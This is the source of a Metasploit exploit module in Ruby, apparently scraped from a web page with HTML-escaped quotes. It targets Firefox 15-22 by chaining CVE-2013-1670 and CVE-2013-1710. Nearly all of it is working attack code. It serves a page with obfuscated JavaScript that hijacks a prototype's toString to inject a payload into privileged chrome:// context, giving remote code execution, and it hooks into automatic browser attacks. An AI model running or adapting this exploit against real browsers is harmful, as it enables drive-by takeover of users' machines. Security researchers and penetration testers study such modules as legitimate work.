# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex/exploitation/jsobfu&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  autopwn_info({
    :ua_name    => HttpClients::FF,
    :ua_minver  => "15.0",
    :ua_maxver  => "22.0",
    :javascript => true,
    :rank       => ExcellentRanking
  })

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox toString console.time Privileged Javascript Injection&#039;,
      &#039;Description&#039;    => %q{
        This exploit gains remote code execution on Firefox 15-22 by abusing two separate
        Javascript-related vulnerabilities to ultimately inject malicious Javascript code
        into a context running with chrome:// privileges.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039;  => [
        &#039;moz_bug_r_a4&#039;, # discovered CVE-2013-1710
        &#039;Cody Crews&#039;,   # discovered CVE-2013-1670
        &#039;joev&#039; # metasploit module
      ],
      &#039;DisclosureDate&#039; => "May 14 2013",
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2013-1670&#039;], # privileged access for content-level constructor
        [&#039;CVE&#039;, &#039;2013-1710&#039;]  # further chrome injection
      ],
      &#039;Targets&#039; => [
        [
          &#039;Universal (Javascript XPCOM Shell)&#039;, {
            &#039;Platform&#039; => &#039;firefox&#039;,
            &#039;Arch&#039; => ARCH_FIREFOX
          }
        ],
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ java linux osx solaris win },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(15, 22) }
      }
    ))

    register_options([
      OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>.", "" ])
    ], self.class)
  end

  def on_request_exploit(cli, request, target_info)
    send_response_html(cli, generate_html(target_info))
  end

  def generate_html(target_info)
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin

    js = Rex::Exploitation::JSObfu.new(%Q|
      var opts = #{JSON.unparse(opts)};
      var key = opts[&#039;#{key}&#039;];
      var y = {}, q = false;
      y.constructor.prototype.toString=function() {
        if (q) return;
        q = true;
        crypto.generateCRMFRequest("CN=Me", "#{Rex::Text.rand_text_alpha(5 + rand(12))}", "#{Rex::Text.rand_text_alpha(5 + rand(12))}", null, key, 1024, null, "rsa-ex");
        return 5;
      };
      console.time(y);
    |)

    js.obfuscate

    %Q|
      <!doctype html>
      <html>
        <body>
          <script>
            #{js}
          </script>
          #{datastore[&#039;CONTENT&#039;]}
        </body>
      </html>
    |
  end
end

